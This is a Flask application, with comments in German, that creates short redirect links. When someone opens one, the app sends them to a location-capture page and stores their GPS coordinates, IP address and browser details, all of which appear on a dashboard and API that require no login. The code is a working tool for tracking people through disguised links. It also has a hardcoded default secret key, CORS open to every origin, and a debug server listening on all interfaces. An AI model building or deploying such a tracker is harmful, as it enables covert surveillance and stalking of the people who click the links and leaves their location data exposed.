from flask import Flask, request, render_template, redirect, url_for, jsonify, flash
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from datetime import datetime
import uuid
import os
from hashids import Hashids
import json
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

app = Flask(__name__, instance_path='/tmp' if os.environ.get('VERCEL') else None)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
db_path = os.environ.get('DATABASE_URL')
if not db_path:
    if os.environ.get('VERCEL'):
        db_path = 'sqlite:///tmp/location_tracker.db'
    else:
        db_path = 'sqlite:///location_tracker.db'
app.config['SQLALCHEMY_DATABASE_URI'] = db_path
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Datenbank und CORS initialisieren
db = SQLAlchemy(app)
CORS(app)

# Tabellen beim ersten Request erstellen
_db_initialized = False
@app.before_request
def init_db():
    global _db_initialized
    if not _db_initialized:
        try:
            db.create_all()
        except Exception:
            pass
        _db_initialized = True

# Hashids initialisieren für Kurz-URLs
hashids = Hashids(min_length=6, salt="location-tracker-salt")

# Models
class TrackedLink(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    original_url = db.Column(db.String(2000), nullable=False)
    short_code = db.Column(db.String(20), unique=True, nullable=True)
    title = db.Column(db.String(200), nullable=False)
    description = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    clicks = db.Column(db.Integer, default=0)
    creator_ip = db.Column(db.String(100))
    
    def to_dict(self):
        return {
            'id': self.id,
            'original_url': self.original_url,
            'short_code': self.short_code,
            'title': self.title,
            'description': self.description,
            'created_at': self.created_at.isoformat() if self.created_at else None,
            'clicks': self.clicks,
            'short_url': url_for('redirect_link', short_code=self.short_code, _external=True)
        }

class LocationData(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    link_id = db.Column(db.Integer, db.ForeignKey('tracked_link.id'), nullable=False)
    latitude = db.Column(db.Float)
    longitude = db.Column(db.Float)
    accuracy = db.Column(db.Float)
    timestamp = db.Column(db.DateTime, default=datetime.utcnow)
    ip_address = db.Column(db.String(100))
    user_agent = db.Column(db.String(500))
    country = db.Column(db.String(100))
    city = db.Column(db.String(100))
    
    # Relationship
    link = db.relationship('TrackedLink', backref=db.backref('locations', lazy=True))
    
    def to_dict(self):
        return {
            'id': self.id,
            'link_id': self.link_id,
            'latitude': self.latitude,
            'longitude': self.longitude,
            'accuracy': self.accuracy,
            'timestamp': self.timestamp.isoformat(),
            'ip_address': self.ip_address,
            'user_agent': self.user_agent,
            'country': self.country,
            'city': self.city
        }

# Routes
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    links = TrackedLink.query.order_by(TrackedLink.created_at.desc()).all()
    return render_template('dashboard.html', links=links)

@app.route('/create', methods=['POST'])
def create_link():
    try:
        data = request.get_json()
        original_url = data.get('url')
        title = data.get('title', 'Unbenannter Link')
        description = data.get('description', '')
        
        if not original_url:
            return jsonify({'error': 'URL is required'}), 400
            
        # Neuen Link erstellen
        new_link = TrackedLink(
            original_url=original_url,
            title=title,
            description=description,
            short_code='',
            creator_ip=request.remote_addr
        )
        
        db.session.add(new_link)
        db.session.flush()  # ID abrufen
        
        # Short-Code aus ID generieren
        new_link.short_code = hashids.encode(new_link.id)
        
        db.session.commit()
        
        return jsonify({
            'success': True,
            'link': new_link.to_dict()
        })
        
    except Exception as e:
        db.session.rollback()
        return jsonify({'error': str(e)}), 500

@app.route('/l/<short_code>')
def redirect_link(short_code):
    link = TrackedLink.query.filter_by(short_code=short_code).first()
    if not link:
        return render_template('404.html'), 404
    
    # Click-Zähler erhöhen
    link.clicks += 1
    db.session.commit()
    
    return render_template('location_capture.html', 
                         link=link, 
                         short_code=short_code,
                         google_maps_api_key=os.environ.get('GOOGLE_MAPS_API_KEY', 'YOUR_API_KEY'))

@app.route('/api/location', methods=['POST'])
def save_location():
    try:
        data = request.get_json()
        short_code = data.get('short_code')
        latitude = data.get('latitude')
        longitude = data.get('longitude')
        accuracy = data.get('accuracy')
        
        link = TrackedLink.query.filter_by(short_code=short_code).first()
        if not link:
            return jsonify({'error': 'Link not found'}), 404
        
        # Standortdaten speichern
        location_data = LocationData(
            link_id=link.id,
            latitude=latitude,
            longitude=longitude,
            accuracy=accuracy,
            ip_address=request.remote_addr,
            user_agent=request.headers.get('User-Agent'),
            country=data.get('country'),
            city=data.get('city')
        )
        
        db.session.add(location_data)
        db.session.commit()
        
        return jsonify({'success': True})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/links/<int:link_id>/locations')
def get_locations(link_id):
    locations = LocationData.query.filter_by(link_id=link_id).order_by(LocationData.timestamp.desc()).all()
    return jsonify([loc.to_dict() for loc in locations])

@app.route('/link/<int:link_id>')
def view_link_details(link_id):
    link = TrackedLink.query.get_or_404(link_id)
    locations = LocationData.query.filter_by(link_id=link_id).order_by(LocationData.timestamp.desc()).all()
    return render_template('link_details.html', 
                         link=link, 
                         locations=locations,
                         google_maps_api_key=os.environ.get('GOOGLE_MAPS_API_KEY', 'YOUR_API_KEY'))

@app.route('/api/links')
def get_links():
    links = TrackedLink.query.order_by(TrackedLink.created_at.desc()).all()
    return jsonify([link.to_dict() for link in links])

@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html'), 404

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=int(os.environ.get('PORT', 5000))) 